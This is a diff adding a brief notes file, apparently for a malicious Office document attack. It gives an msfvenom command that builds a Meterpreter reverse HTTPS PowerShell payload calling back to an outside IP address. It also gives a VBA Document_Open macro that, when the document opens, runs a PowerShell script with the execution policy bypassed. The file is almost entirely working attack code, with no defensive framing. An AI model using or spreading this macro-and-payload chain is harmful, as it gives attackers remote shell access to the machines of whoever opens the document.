@@ -1,0 +1,27 @@
+1) Reverse HTTPS Powershell:
+
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=223.184.17.80 -f psh > ps_rev_https.ps1
+
+
+2) VBA Script:
+
+Sub Document_Open()
+    shellexec
+End Sub
+
+
+Sub shellexec()
+    Dim scriptPath As String
+    scriptPath = "C:\Users\SHAZAM\Desktop\Shazam\Exp-1\ps_payload64.ps1"  ' Replace with the actual path to your local script
+
+    Dim str As String
+    str = "powershell.exe -ExecutionPolicy Bypass -File " & scriptPath
+    Shell str, vbNormalFocus
+    MsgBox "Script Executed Successfuly"
+End Sub
+
+
+
+
+
+
